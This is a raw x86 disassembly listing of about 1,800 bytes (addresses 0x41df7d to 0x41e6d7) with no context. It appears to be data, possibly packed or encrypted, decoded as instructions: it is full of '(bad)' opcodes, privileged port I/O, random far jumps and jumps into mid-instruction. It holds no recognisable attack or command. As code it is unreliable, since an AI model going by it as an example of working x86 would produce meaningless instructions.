  41df7d:	jmp    0x55a1:0xb1668604
  41df84:	jno    0x41dfbc
  41df86:	cmp    ebx,DWORD PTR [ebp+0x9d56ce5]
  41df8c:	push   cs
  41df8d:	xor    DWORD PTR [edi+0x58f99959],esi
  41df93:	mov    DWORD PTR [eax],ebp
  41df95:	jae    0x41dfaf
  41df97:	add    DWORD PTR [edx+0x23],eax
  41df9a:	adc    al,0x9a
  41df9c:	aad    0x6e
  41df9e:	leave  
  41df9f:	jecxz  0x41df65
  41dfa1:	jne    0x41df61
  41dfa3:	loope  0x41dfed
  41dfa5:	sub    DWORD PTR [esi-0x2b091f65],esi
  41dfab:	mov    ds:0x91085e53,al
  41dfb0:	jnp    0x41df6b
  41dfb2:	jne    0x41df44
  41dfb4:	js     0x41dfa3
  41dfb6:	or     BYTE PTR [edx+0x68],ch
  41dfb9:	xchg   edi,eax
  41dfba:	inc    edx
  41dfbb:	cmp    ch,BYTE PTR [edi-0x14]
  41dfbe:	(bad)  
  41dfbf:	mov    eax,0xc132262b
  41dfc4:	jae    0x41df8c
  41dfc6:	pop    ebx
  41dfc7:	mov    ds:0x9a29ce98,eax
  41dfcc:	popf   
  41dfcd:	data16 jno 0x41df84
  41dfd0:	sub    bh,BYTE PTR [edi]
  41dfd2:	outs   dx,BYTE PTR ds:[esi]
  41dfd3:	aam    0x3b
  41dfd5:	imul   ebp,DWORD PTR [eax-0x40],0x5a
  41dfd9:	or     esp,ebp
  41dfdb:	gs xchg ah,ch
  41dfde:	add    al,0x4f
  41dfe0:	mov    al,0x94
  41dfe2:	jge    0x41dfc0
  41dfe4:	imul   ebp,DWORD PTR [ecx+0x1b656203],0xcfcde42f
  41dfee:	dec    esi
  41dfef:	sub    bh,ah
  41dff1:	mov    eax,ds:0x4faa9f79
  41dff6:	std    
  41dff7:	mov    bh,0xa8
  41dff9:	jecxz  0x41dfbf
  41dffb:	sti    
  41dffc:	pop    ecx
  41dffd:	mov    DWORD PTR [ecx+0x2a],ecx
  41e000:	mov    bl,BYTE PTR [eax+0x4]
  41e003:	adc    ebp,ebx
  41e005:	cdq    
  41e006:	push   ebp
  41e007:	jmp    0x41e005
  41e009:	add    esp,edx
  41e00b:	and    cx,WORD PTR [ebx+0x5818b3ba]
  41e012:	shl    DWORD PTR [esi+0x27320a33],cl
  41e018:	lahf   
  41e019:	stc    
  41e01a:	out    dx,al
  41e01b:	sbb    eax,0xaf4e4938
  41e020:	popf   
  41e021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e022:	fs sub edi,0xffffffef
  41e026:	mov    edx,0x226680d
  41e02b:	mov    BYTE PTR [ebx-0x57],ch
  41e02e:	pop    ecx
  41e02f:	sbb    al,0x74
  41e031:	pop    edx
  41e032:	inc    esp
  41e033:	fdecstp 
  41e035:	div    BYTE PTR [ecx+0x1]
  41e038:	mov    cs,WORD PTR [edx-0x3c]
  41e03b:	and    BYTE PTR [edi],bh
  41e03d:	jae    0x41e0a1
  41e03f:	mov    ebp,0x7ebe6598
  41e044:	cmp    BYTE PTR [ecx-0x484dc603],ch
  41e04a:	(bad)  
  41e04b:	call   0x8953f6bf
  41e050:	pop    ecx
  41e051:	retf   0x223b
  41e054:	mov    al,ds:0x23363ebb
  41e059:	retf   0x7713
  41e05c:	pop    ebp
  41e05d:	push   0xf1a9d531
  41e062:	adc    al,0xb8
  41e064:	or     al,0x89
  41e066:	inc    edx
  41e067:	or     BYTE PTR [edx],0x2f
  41e06a:	push   edi
  41e06b:	and    dh,BYTE PTR [ebx]
  41e06d:	stos   BYTE PTR es:[edi],al
  41e06e:	adc    eax,0xdc7ea792
  41e073:	push   es
  41e074:	jnp    0x41e0af
  41e076:	push   0x5d6e161e
  41e07b:	inc    edx
  41e07c:	lds    esi,FWORD PTR [esi-0x1467170e]
  41e082:	mov    ecx,cs
  41e084:	pop    eax
  41e085:	shl    ebp,0x9
  41e088:	xchg   ebp,eax
  41e089:	hlt    
  41e08a:	adc    ebp,DWORD PTR [edx+0x39]
  41e08d:	inc    edi
  41e08e:	daa    
  41e08f:	dec    ebx
  41e090:	popa   
  41e091:	mov    esp,0x4248bfed
  41e096:	jb     0x41e034
  41e098:	pushf  
  41e099:	sti    
  41e09a:	lods   eax,DWORD PTR ds:[esi]
  41e09b:	or     esp,DWORD PTR [edx+0x14bb1561]
  41e0a1:	aam    0x34
  41e0a3:	ret    
  41e0a4:	jecxz  0x41e0aa
  41e0a6:	xor    DWORD PTR ds:0xa91ea3e0,edi
  41e0ac:	shl    BYTE PTR [edi+0x37],0x14
  41e0b0:	push   0x1f5f04be
  41e0b5:	mov    dh,BYTE PTR [edx-0x74d0e93f]
  41e0bb:	xchg   esi,eax
  41e0bc:	pop    ds
  41e0bd:	sub    ebx,DWORD PTR [eax]
  41e0bf:	inc    edx
  41e0c0:	fist   DWORD PTR [esi]
  41e0c2:	push   esi
  41e0c3:	pop    ebp
  41e0c4:	out    dx,eax
  41e0c5:	add    eax,0xb9f4c9d
  41e0ca:	inc    ebp
  41e0cb:	xchg   DWORD PTR [ebx-0x23d5a0c8],esi
  41e0d1:	or     al,0xcb
  41e0d3:	mov    ch,0x30
  41e0d5:	mov    dh,BYTE PTR [edi]
  41e0d7:	stc    
  41e0d8:	inc    ebp
  41e0d9:	cmp    BYTE PTR [ebx],bl
  41e0db:	imul   edi,DWORD PTR [edx],0xffffffdb
  41e0de:	fistp  WORD PTR [ebx-0x55]
  41e0e1:	idiv   BYTE PTR [ebp+edx*1-0x5b]
  41e0e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0e6:	sbb    al,0x3b
  41e0e8:	adc    al,0x4f
  41e0ea:	and    ch,0x25
  41e0ed:	lahf   
  41e0ee:	addr16 jbe 0x41e0f5
  41e0f1:	push   ds
  41e0f2:	pusha  
  41e0f3:	clc    
  41e0f4:	fucomi st,st(0)
  41e0f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0f7:	jmp    0x41e0b7
  41e0f9:	jmp    0x41e13e
  41e0fb:	xor    DWORD PTR [ebp-0x6ad74b92],esi
  41e101:	out    0x5d,al
  41e103:	xor    eax,0x479ff467
  41e108:	les    ebx,FWORD PTR [ebp+0x27]
  41e10b:	fcomip st,st(2)
  41e10d:	outs   dx,DWORD PTR ds:[esi]
  41e10e:	sub    al,0x15
  41e110:	push   ebx
  41e111:	sahf   
  41e112:	and    BYTE PTR [edx+ebp*2],al
  41e115:	adc    al,0xbd
  41e117:	xchg   BYTE PTR [eax+0x7c],cl
  41e11a:	enter  0x619,0x18
  41e11e:	iret   
  41e11f:	aas    
  41e120:	out    0x83,al
  41e122:	pop    ss
  41e123:	hlt    
  41e124:	xor    eax,0x1ff41e3a
  41e129:	mov    ch,BYTE PTR [ebx-0x11d35cec]
  41e12f:	jp     0x41e0bb
  41e131:	cmp    ebx,DWORD PTR [eax-0x77]
  41e134:	(bad)  
  41e135:	out    dx,eax
  41e136:	mov    edi,0x2e9031d5
  41e13b:	xchg   esi,eax
  41e13c:	jnp    0x41e121
  41e13e:	dec    BYTE PTR [ecx-0x6c156104]
  41e144:	xor    ah,al
  41e146:	add    DWORD PTR [ebx],eax
  41e148:	rol    esp,cl
  41e14a:	(bad)  
  41e14c:	(bad)  
  41e14d:	fsubp  st(4),st
  41e14f:	pushf  
  41e150:	fimul  WORD PTR [eax]
  41e152:	adc    esp,DWORD PTR [ecx]
  41e154:	popa   
  41e155:	mov    DWORD PTR [edx-0x45],eax
  41e158:	ins    BYTE PTR es:[edi],dx
  41e159:	mov    bh,0xa7
  41e15b:	sub    ebx,ecx
  41e15d:	pop    esi
  41e15e:	mov    ebp,0x137a2c62
  41e163:	leave  
  41e164:	and    dl,0x1
  41e167:	inc    esp
  41e168:	stos   DWORD PTR es:[edi],eax
  41e169:	jp     0x41e11f
  41e16b:	iret   
  41e16c:	enter  0x99a2,0xed
  41e170:	ins    BYTE PTR es:[edi],dx
  41e171:	aaa    
  41e172:	nop
  41e173:	push   es
  41e174:	icebp  
  41e175:	ss (bad) 
  41e177:	test   eax,0xd9e6e2ce
  41e17c:	dec    edi
  41e17d:	push   edi
  41e17e:	xor    DWORD PTR [eax+ebp*2+0xab39572],edi
  41e185:	or     al,0xd8
  41e187:	(bad)  
  41e188:	in     al,dx
  41e189:	ficomp WORD PTR [eax]
  41e18b:	mov    dl,bh
  41e18d:	adc    esp,DWORD PTR [ebp-0x57901ff8]
  41e193:	mov    cl,0x3e
  41e195:	mov    ecx,0xca1eed63
  41e19a:	iret   
  41e19b:	add    eax,0xd6ee801d
  41e1a0:	sub    eax,0x36d015a9
  41e1a5:	clc    
  41e1a6:	(bad)  
  41e1a7:	fidivr WORD PTR [esi]
  41e1a9:	push   ss
  41e1aa:	or     DWORD PTR [esi],ecx
  41e1ac:	mul    DWORD PTR [edi-0x4dcce4b8]
  41e1b2:	inc    ebx
  41e1b3:	shl    DWORD PTR [ebp-0x5dd27add],cl
  41e1b9:	jmp    0x41e17a
  41e1bb:	xor    edx,esp
  41e1bd:	mov    esp,0x91b05c11
  41e1c2:	scas   al,BYTE PTR es:[edi]
  41e1c3:	(bad)  
  41e1c4:	ins    DWORD PTR es:[edi],dx
  41e1c5:	in     al,0xdf
  41e1c7:	xlat   BYTE PTR ds:[ebx]
  41e1c8:	or     DWORD PTR [edx-0x2ae43bb1],edx
  41e1ce:	adc    DWORD PTR [ebx+0x6131418d],ebp
  41e1d4:	xchg   edi,eax
  41e1d5:	call   0x6605fbfe
  41e1da:	arpl   WORD PTR [ebx-0x3d],si
  41e1dd:	or     edx,DWORD PTR [eax-0x769eaf46]
  41e1e3:	and    eax,0x18e24fd4
  41e1e8:	aad    0xf1
  41e1ea:	mov    bh,0x86
  41e1ec:	pop    ecx
  41e1ed:	mov    ebx,edx
  41e1ef:	jno    0x41e225
  41e1f1:	es sub eax,0xadcbbc26
  41e1f7:	popa   
  41e1f8:	mov    ss,edi
  41e1fa:	outs   dx,DWORD PTR ds:[esi]
  41e1fb:	(bad)  
  41e1fc:	iret   
  41e1fd:	fcmovnbe st,st(4)
  41e1ff:	outs   dx,DWORD PTR ds:[esi]
  41e200:	sbb    BYTE PTR [edx+0x6215bf29],al
  41e206:	push   ds
  41e207:	jle    0x41e23a
  41e209:	je     0x41e1f0
  41e20b:	pop    ss
  41e20c:	jmp    0x52a3:0xf18b4001
  41e213:	dec    ebx
  41e214:	loope  0x41e26d
  41e216:	and    DWORD PTR gs:[edx+0x47],0x7d
  41e21b:	(bad)  
  41e21c:	adc    ah,BYTE PTR [ecx-0x3b]
  41e21f:	test   ah,bl
  41e221:	jg     0x41e1cb
  41e223:	mov    ds:0x84e63d4a,eax
  41e228:	cmp    DWORD PTR [ebx+ebx*4+0x2f],0x21
  41e22d:	inc    ecx
  41e22e:	jns    0x41e1d8
  41e230:	setno  dl
  41e233:	jmp    0x67d373a1
  41e238:	sar    edi,cl
  41e23a:	mov    esp,DWORD PTR [eax+0x1]
  41e23d:	xor    eax,0x6b4d48c
  41e242:	jmp    0x1654d05e
  41e247:	add    dh,bh
  41e249:	push   esi
  41e24a:	or     al,0xb6
  41e24c:	mov    ds:0xf6b8b4c7,al
  41e251:	push   ds
  41e252:	dec    edx
  41e253:	neg    BYTE PTR [edi+esi*4]
  41e256:	sub    al,0x9a
  41e258:	cmc    
  41e259:	xchg   ecx,eax
  41e25a:	cs mov ecx,0xc3ccc98d
  41e260:	(bad)  
  41e261:	call   0x19a156dd
  41e266:	cld    
  41e267:	mov    DWORD PTR [ecx-0x2f],ecx
  41e26a:	pusha  
  41e26b:	in     eax,dx
  41e26c:	hlt    
  41e26d:	ins    BYTE PTR es:[edi],dx
  41e26e:	sti    
  41e26f:	in     eax,0xa9
  41e271:	jbe    0x41e272
  41e273:	pop    ss
  41e274:	adc    edi,esi
  41e276:	int3   
  41e277:	popf   
  41e278:	lock add DWORD PTR [ecx-0x74],eax
  41e27c:	mov    ch,BYTE PTR [ebx]
  41e27e:	push   ebx
  41e27f:	mov    ebp,0xc6b9da53
  41e284:	mov    al,ds:0x38214339
  41e289:	les    esi,FWORD PTR [ebp+0x15]
  41e28c:	popa   
  41e28d:	fwait
  41e28e:	or     edx,DWORD PTR [edi-0x440ea906]
  41e294:	(bad)  
  41e296:	cdq    
  41e297:	imul   edi,DWORD PTR [eax-0x17],0xffffffae
  41e29b:	retf   0x550f
  41e29e:	dec    ebp
  41e29f:	imul   ebp,esp,0xffffff89
  41e2a2:	adc    eax,DWORD PTR [esi]
  41e2a4:	stc    
  41e2a5:	stos   BYTE PTR es:[edi],al
  41e2a6:	repz or DWORD PTR [ecx-0x20],ebp
  41e2aa:	sub    al,0xf5
  41e2ac:	push   ecx
  41e2ad:	je     0x41e28a
  41e2af:	push   edi
  41e2b0:	psadbw mm2,QWORD PTR [edx]
  41e2b3:	pop    ecx
  41e2b4:	shl    ebx,1
  41e2b6:	push   esi
  41e2b7:	out    dx,eax
  41e2b8:	mov    ecx,0x4476332b
  41e2bd:	cmp    esp,esi
  41e2bf:	in     eax,dx
  41e2c0:	xor    ebp,DWORD PTR [ecx-0x18b95e64]
  41e2c6:	cmp    ah,dh
  41e2c8:	fiadd  WORD PTR [ebx]
  41e2ca:	outs   dx,BYTE PTR ds:[esi]
  41e2cb:	sub    ebp,0xa2d079f9
  41e2d1:	mov    es,WORD PTR [ecx]
  41e2d3:	or     DWORD PTR [ecx+0x1f],0x2f700168
  41e2da:	cmc    
  41e2db:	jno    0x41e299
  41e2dd:	cmp    edi,DWORD PTR [ebp+0x6e05d078]
  41e2e3:	dec    edx
  41e2e4:	mov    edx,DWORD PTR [ebx-0x1d]
  41e2e7:	cmp    al,cl
  41e2e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2ea:	mov    BYTE PTR [esi+0x36],ah
  41e2ed:	es mov bh,0x24
  41e2f0:	(bad)  
  41e2f1:	shl    DWORD PTR [eax+0x29],0x4b
  41e2f5:	sti    
  41e2f6:	out    dx,eax
  41e2f7:	pop    eax
  41e2f8:	neg    cl
  41e2fa:	or     eax,0xb8492da7
  41e2ff:	or     al,0xef
  41e301:	add    DWORD PTR [edi-0x43],esi
  41e304:	inc    eax
  41e305:	outs   dx,DWORD PTR ds:[esi]
  41e306:	test   BYTE PTR [edi],0x38
  41e309:	xor    BYTE PTR [ecx+0x1b],ah
  41e30c:	push   esi
  41e30d:	inc    dl
  41e30f:	push   0xffffff8b
  41e311:	or     al,0xf
  41e313:	mov    ebx,0x4c8e2ec2
  41e318:	push   cs
  41e319:	test   al,0x6c
  41e31b:	mov    al,gs:0xd7324d81
  41e321:	adc    edx,DWORD PTR fs:[esi-0x38e6cb54]
  41e328:	xchg   edx,eax
  41e329:	int3   
  41e32a:	ins    BYTE PTR es:[edi],dx
  41e32b:	(bad)  
  41e32c:	es dec edi
  41e32e:	or     eax,0xf67a7a54
  41e333:	push   ss
  41e334:	into   
  41e335:	div    DWORD PTR [esi]
  41e337:	dec    ecx
  41e338:	lea    eax,[ecx+0x7f]
  41e33b:	adc    edx,DWORD PTR [ecx]
  41e33d:	jne    0x41e2c6
  41e33f:	clc    
  41e340:	push   esp
  41e341:	cmp    al,0xbf
  41e343:	push   es
  41e344:	scas   al,BYTE PTR es:[edi]
  41e345:	scas   eax,DWORD PTR es:[edi]
  41e346:	xchg   esp,eax
  41e347:	dec    ecx
  41e348:	lea    edi,[esp-0x40f6a93f]
  41e34f:	out    dx,al
  41e350:	fisub  DWORD PTR [bp+si+0x4593]
  41e355:	push   ebp
  41e356:	and    BYTE PTR [ebx],bh
  41e358:	aad    0x68
  41e35a:	mov    ebp,0x3a417be2
  41e35f:	fwait
  41e360:	pop    esp
  41e361:	sub    esp,DWORD PTR [eax+0x2ba3a974]
  41e367:	mov    bh,0xcb
  41e369:	and    DWORD PTR [edi],edx
  41e36b:	xor    edi,esi
  41e36d:	scas   eax,DWORD PTR es:[edi]
  41e36e:	xchg   edi,eax
  41e36f:	mov    ah,0x1
  41e371:	sub    BYTE PTR [edx],ch
  41e373:	push   ecx
  41e374:	or     edx,DWORD PTR [eax-0x25cb639e]
  41e37a:	xor    dh,dl
  41e37c:	adc    ecx,ebx
  41e37e:	cdq    
  41e37f:	lods   eax,DWORD PTR ds:[esi]
  41e380:	and    cl,0xde
  41e383:	fnstcw WORD PTR [ebx]
  41e385:	or     edx,edi
  41e387:	inc    ecx
  41e388:	sub    esi,DWORD PTR [eax]
  41e38a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38b:	add    DWORD PTR [edx+0xe],0xb3273b10
  41e392:	out    dx,eax
  41e393:	in     eax,0x4f
  41e395:	out    0x31,eax
  41e397:	adc    BYTE PTR [edx-0x545e0b9d],bl
  41e39d:	jb     0x41e360
  41e39f:	inc    esi
  41e3a0:	imul   ebx,DWORD PTR [ebx+0x11],0x15
  41e3a4:	mov    dl,0xd5
  41e3a6:	out    dx,eax
  41e3a7:	xlat   BYTE PTR ds:[ebx]
  41e3a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3a9:	jl     0x41e33d
  41e3ab:	and    al,0x52
  41e3ad:	stos   DWORD PTR es:[edi],eax
  41e3ae:	fisubr WORD PTR fs:[edx-0x3f8d0dda]
  41e3b5:	mov    ebp,0x27ac712b
  41e3ba:	retf   0xcec2
  41e3bd:	cmp    ebp,esp
  41e3bf:	fisub  DWORD PTR [edx-0x64]
  41e3c2:	adc    DWORD PTR [ecx-0x2a88c63f],edi
  41e3c8:	push   cs
  41e3c9:	cmp    ch,0xcd
  41e3cc:	pop    ds
  41e3cd:	pop    esp
  41e3ce:	bound  ecx,QWORD PTR [ebp+0x69430b38]
  41e3d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3d5:	xlat   BYTE PTR ds:[ebx]
  41e3d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3d7:	dec    ecx
  41e3d8:	ret    
  41e3d9:	loop   0x41e3f0
  41e3db:	test   DWORD PTR [edi+0x3],ecx
  41e3de:	dec    esi
  41e3e0:	or     al,0x81
  41e3e2:	hlt    
  41e3e3:	sub    al,0x7f
  41e3e5:	mov    cl,0xf5
  41e3e7:	jle    0x41e3f4
  41e3e9:	in     al,0xec
  41e3eb:	mov    esi,0xc6ee48b8
  41e3f0:	call   0xd43c:0x55aa8e63
  41e3f7:	mov    dl,0x25
  41e3f9:	rdmsr  
  41e3fb:	xor    BYTE PTR [eax],dh
  41e3fd:	out    0x30,eax
  41e3ff:	add    BYTE PTR [esi-0x5fcff5dd],cl
  41e405:	pop    ecx
  41e406:	shl    dh,0x17
  41e409:	daa    
  41e40a:	rol    DWORD PTR [ecx],1
  41e40c:	pushf  
  41e40d:	xor    DWORD PTR [esi+0xdab1754],esi
  41e413:	(bad)  
  41e414:	lods   al,BYTE PTR ds:[esi]
  41e415:	int3   
  41e416:	aam    0xb6
  41e418:	jmp    0x41e3ad
  41e41a:	add    BYTE PTR [edi-0x1e96b69c],0x50
  41e421:	adc    DWORD PTR [ebx-0x318e862b],ecx
  41e427:	inc    edi
  41e428:	ret    
  41e429:	cmp    eax,0xc15c52d0
  41e42e:	pop    ds
  41e42f:	push   edi
  41e430:	data16 clc 
  41e432:	or     eax,0x5bd25661
  41e437:	add    esi,DWORD PTR [esi+0x60]
  41e43a:	inc    edi
  41e43b:	test   al,0x8b
  41e43d:	test   eax,0x58487dc6
  41e442:	sub    eax,0x406edbb3
  41e447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e448:	popf   
  41e449:	je     0x41e43a
  41e44b:	shl    DWORD PTR [edx],cl
  41e44d:	mov    cl,0xb8
  41e44f:	inc    eax
  41e450:	int3   
  41e451:	mov    ah,0xbb
  41e453:	fmul   DWORD PTR [ecx-0x52]
  41e456:	imul   esp,DWORD PTR [esi-0x6f6319cc],0x74
  41e45d:	jecxz  0x41e45e
  41e45f:	repz jmp 0x41e48f
  41e462:	mov    esp,0x56f72903
  41e467:	icebp  
  41e468:	mov    ecx,0x9b620c7a
  41e46d:	les    esp,FWORD PTR [esi]
  41e46f:	shl    DWORD PTR [esi+eiz*1-0x17f7d66],cl
  41e476:	push   edx
  41e477:	loope  0x41e48b
  41e479:	sub    DWORD PTR [eax-0x45c20995],edi
  41e47f:	xchg   edx,eax
  41e480:	neg    BYTE PTR [ebx-0x41cd8a2d]
  41e486:	rcr    eax,0xc5
  41e489:	out    dx,al
  41e48a:	mov    al,0xb1
  41e48c:	loope  0x41e4c2
  41e48e:	je     0x41e4d4
  41e490:	jo     0x41e46f
  41e492:	arpl   WORD PTR [ecx-0x51],dx
  41e495:	xor    BYTE PTR [ebp-0x28],bh
  41e498:	and    eax,0x258aa7bd
  41e49d:	jns    0x41e4ec
  41e49f:	pop    ebp
  41e4a0:	fwait
  41e4a1:	mov    eax,0x7965472
  41e4a7:	jecxz  0x41e436
  41e4a9:	jg     0x41e46e
  41e4ab:	inc    ecx
  41e4ac:	jns    0x41e487
  41e4ae:	cwde   
  41e4af:	push   esi
  41e4b0:	push   edx
  41e4b1:	adc    ch,BYTE PTR [edi+0x213e8ff5]
  41e4b7:	jle    0x41e4bf
  41e4b9:	fcom   DWORD PTR ds:[eax+ecx*4-0x1c]
  41e4be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4bf:	or     DWORD PTR [edi+0x32e1772],edi
  41e4c5:	and    ecx,0x5b72e1f9
  41e4cb:	mov    gs,WORD PTR [edi-0x33]
  41e4ce:	mov    bl,0xe9
  41e4d0:	mov    bl,0x73
  41e4d2:	cdq    
  41e4d3:	mov    eax,ds:0xbcd65c6b
  41e4d8:	imul   ebx,DWORD PTR [ebp+0x40],0x94b2adde
  41e4df:	repz cmp eax,0xc143c95
  41e4e5:	push   0x98cf4319
  41e4ea:	and    DWORD PTR [eax+0x599c6b36],eax
  41e4f0:	icebp  
  41e4f1:	ret    
  41e4f2:	inc    ecx
  41e4f3:	push   ebp
  41e4f4:	pop    eax
  41e4f5:	or     bh,BYTE PTR ds:[edi-0xc4e2a44]
  41e4fc:	nop
  41e4fd:	hlt    
  41e4fe:	or     eax,0x17cd2e6d
  41e503:	(bad)  
  41e504:	outs   dx,DWORD PTR ds:[esi]
  41e505:	jae    0x41e554
  41e507:	xchg   BYTE PTR [ecx-0xf48bed6],ch
  41e50d:	cmpxchg cl,al
  41e510:	cmp    ebp,DWORD PTR [ecx-0x5b]
  41e513:	jns    0x41e4cd
  41e515:	stos   DWORD PTR es:[edi],eax
  41e516:	repnz rcr DWORD PTR [edx-0x3dbf8414],0x7c
  41e51e:	nop
  41e51f:	jo     0x41e558
  41e521:	in     al,dx
  41e522:	sbb    al,0x28
  41e524:	push   esp
  41e525:	retf   
  41e526:	or     esp,esp
  41e528:	aad    0x76
  41e52a:	xchg   edx,eax
  41e52b:	sbb    edx,esi
  41e52d:	or     esi,DWORD PTR [ecx+0x516e5721]
  41e533:	add    ah,al
  41e535:	dec    ebp
  41e536:	sbb    BYTE PTR [ecx+eax*4-0x15],dl
  41e53a:	std    
  41e53b:	outs   dx,BYTE PTR ds:[esi]
  41e53c:	iret   
  41e53d:	xchg   esi,eax
  41e53e:	inc    edi
  41e53f:	jmp    0xb272a277
  41e544:	xchg   DWORD PTR [edi+0x4ec3aa39],edi
  41e54a:	inc    edi
  41e54b:	cs std 
  41e54d:	ss in  eax,0x81
  41e550:	push   eax
  41e551:	fwait
  41e552:	cmc    
  41e553:	or     eax,0x1aa786af
  41e558:	adc    eax,0x9c403b1e
  41e55d:	jge    0x41e58f
  41e55f:	fiadd  WORD PTR [edi]
  41e561:	cmp    al,0x59
  41e563:	mov    DWORD PTR [edx-0x7b0b81cf],ebx
  41e569:	ins    DWORD PTR es:[edi],dx
  41e56a:	and    bh,bh
  41e56c:	mov    bh,0x8
  41e56e:	aas    
  41e56f:	push   ds
  41e570:	adc    BYTE PTR [edi+0x562d6bd],bh
  41e576:	and    DWORD PTR [edi],ebx
  41e578:	jb     0x41e5cf
  41e57a:	das    
  41e57b:	pop    esp
  41e57c:	add    DWORD PTR [ebx+0x24ade625],0xffffffb6
  41e583:	push   edi
  41e584:	mov    ebp,0x84f737a6
  41e589:	loope  0x41e5be
  41e58b:	aas    
  41e58c:	cli    
  41e58d:	mov    ecx,0x472b1d01
  41e592:	sahf   
  41e593:	dec    ebx
  41e594:	pop    esi
  41e595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e596:	inc    esi
  41e597:	ret    
  41e598:	or     al,0x1
  41e59a:	add    esi,ebp
  41e59c:	imul   ebx,DWORD PTR [edx+0x5a29508],0xffffff83
  41e5a3:	pop    edx
  41e5a4:	xor    esi,DWORD PTR [eax-0x39a77f43]
  41e5aa:	and    al,0x22
  41e5ac:	in     eax,dx
  41e5ad:	mov    edx,DWORD PTR [ecx+0x53]
  41e5b0:	cs dec edi
  41e5b2:	push   eax
  41e5b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5b4:	add    esp,eax
  41e5b6:	cmp    ebp,DWORD PTR [edi+0x17d4b5b4]
  41e5bc:	xor    eax,0x8a41ac6
  41e5c1:	pop    ss
  41e5c2:	adc    al,0xec
  41e5c4:	int    0xa7
  41e5c6:	adc    ah,bl
  41e5c8:	aaa    
  41e5c9:	ds sub al,0x70
  41e5cc:	jne    0x41e586
  41e5ce:	cmp    DWORD PTR [edx+0x5d],esp
  41e5d1:	sbb    ebx,eax
  41e5d3:	cmp    eax,0x1fc011b0
  41e5d8:	pop    edx
  41e5d9:	xchg   edi,eax
  41e5da:	sub    eax,ebp
  41e5dc:	popf   
  41e5dd:	jecxz  0x41e5c6
  41e5df:	call   0x8b11df17
  41e5e4:	pmulhuw mm5,QWORD PTR [eax+0x641347c2]
  41e5eb:	jge    0x41e570
  41e5ed:	in     eax,0x59
  41e5ef:	stos   BYTE PTR es:[edi],al
  41e5f0:	cmp    eax,DWORD PTR [edi]
  41e5f2:	pop    ebx
  41e5f3:	js     0x41e5ab
  41e5f5:	pop    es
  41e5f6:	sahf   
  41e5f7:	push   cs
  41e5f8:	sbb    dh,BYTE PTR [ebp+0x2afccab9]
  41e5fe:	mov    edi,0xdd4bb451
  41e603:	lock ins DWORD PTR es:[edi],dx
  41e605:	lds    ecx,FWORD PTR [edi-0x2]
  41e608:	and    ebp,0x70
  41e60b:	pop    eax
  41e60c:	int    0x23
  41e60e:	out    0x29,al
  41e610:	mov    DWORD PTR [ebx-0xa],edi
  41e613:	jg     0x41e5d6
  41e615:	push   cs
  41e616:	rcl    BYTE PTR [ebp+0x6f],cl
  41e619:	aad    0xd4
  41e61b:	ja     0x41e5e8
  41e61d:	push   0xf3c950fe
  41e622:	mov    edi,0xd250584b
  41e627:	ret    
  41e628:	lods   eax,DWORD PTR ds:[esi]
  41e629:	pop    gs
  41e62b:	adc    ch,bh
  41e62d:	xor    edx,ecx
  41e62f:	add    al,0xbc
  41e631:	adc    DWORD PTR [edi-0x23],ecx
  41e634:	add    eax,0x9ee31200
  41e639:	inc    esi
  41e63a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e63b:	sbb    dl,dh
  41e63d:	sbb    ecx,DWORD PTR [esi-0x26bca96d]
  41e643:	fbstp  TBYTE PTR [esp+eax*4-0x7e496f8]
  41e64a:	pop    esi
  41e64b:	fist   DWORD PTR [ebx]
  41e64d:	xchg   ecx,eax
  41e64e:	aaa    
  41e64f:	fnsave [esi-0x62247cb2]
  41e655:	adc    eax,0x4a7557cf
  41e65a:	leave  
  41e65b:	leave  
  41e65c:	stos   DWORD PTR es:[edi],eax
  41e65d:	scas   eax,DWORD PTR es:[edi]
  41e65e:	fs gs sub dl,bh
  41e662:	mov    edi,fs
  41e664:	(bad)  
  41e665:	int3   
  41e666:	push   ebp
  41e667:	pop    ss
  41e668:	outs   dx,BYTE PTR ss:[esi]
  41e66a:	pop    edi
  41e66b:	ret    
  41e66c:	frstor [ecx]
  41e66e:	outs   dx,DWORD PTR ds:[esi]
  41e66f:	bound  edi,QWORD PTR [esi-0x4d]
  41e672:	dec    esp
  41e673:	pop    eax
  41e674:	ja     0x41e69b
  41e676:	pop    DWORD PTR [ebx+eax*4]
  41e679:	fmul   QWORD PTR [ebx]
  41e67b:	fst    DWORD PTR [edi]
  41e67d:	loop   0x41e694
  41e67f:	pop    eax
  41e680:	xor    bh,BYTE PTR [ecx-0x6a82159d]
  41e686:	into   
  41e687:	cmp    cl,BYTE PTR [ebp-0x22]
  41e68a:	xor    edx,ebp
  41e68c:	loopne 0x41e6b4
  41e68e:	loop   0x41e6c9
  41e690:	inc    ecx
  41e691:	shl    BYTE PTR [eax-0x3c],1
  41e694:	add    DWORD PTR [ebp+0x7],esp
  41e697:	xlat   BYTE PTR ds:[ebx]
  41e698:	push   ebx
  41e699:	out    dx,al
  41e69a:	and    eax,0x9a5dfc97
  41e69f:	jmp    0x469043c6
  41e6a4:	xchg   edx,eax
  41e6a5:	sbb    eax,0x25f1b177
  41e6aa:	call   0xa827ad75
  41e6af:	adc    al,0xbb
  41e6b1:	icebp  
  41e6b2:	mov    ecx,0x5fb3918a
  41e6b7:	clc    
  41e6b8:	mov    esi,0x856e442
  41e6bd:	popa   
  41e6be:	xchg   edx,eax
  41e6bf:	xchg   ecx,eax
  41e6c0:	push   es
  41e6c1:	cdq    
  41e6c2:	loopne 0x41e64f
  41e6c4:	add    al,0x87
  41e6c6:	mov    ebx,0xeaaed6df
  41e6cb:	fs xor ecx,edx
  41e6ce:	sbb    al,0xdc
  41e6d0:	shl    DWORD PTR [ebx-0x3dc49a20],0x18
  41e6d7:	and    DWORD PTR [edx-0x57],0xffffff90
